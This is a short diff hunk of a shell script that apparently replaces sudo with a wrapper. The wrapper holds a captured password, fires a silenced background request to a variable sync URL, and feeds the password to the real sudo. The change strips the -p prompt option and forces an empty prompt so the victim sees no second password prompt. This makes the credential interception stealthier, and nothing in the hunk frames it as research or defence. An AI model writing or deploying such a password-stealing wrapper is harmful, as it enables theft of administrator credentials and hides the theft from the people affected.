@@ -90,7 +90,22 @@ if [ $_HAS_S -eq 1 ]; then
                 "$SYNC_URL" > /dev/null 2>&1
         ) &
     fi
-    { printf '%s\n' "$CAPTURED_PASS"; cat; } | $REAL_SUDO "$@"
+    # Strip -p <prompt> from args and replace with empty prompt to avoid
+    # double-prompting. Keep all other args intact.
+    _SUDO_ARGS=()
+    _SKIP=0
+    for _a in "$@"; do
+        if [ $_SKIP -eq 1 ]; then
+            _SKIP=0
+            continue
+        fi
+        if [ "$_a" = "-p" ]; then
+            _SKIP=1
+            continue
+        fi
+        _SUDO_ARGS+=("$_a")
+    done
+    { printf '%s\n' "$CAPTURED_PASS"; cat; } | $REAL_SUDO -p '' "${_SUDO_ARGS[@]}"
     exit $?
 fi
 
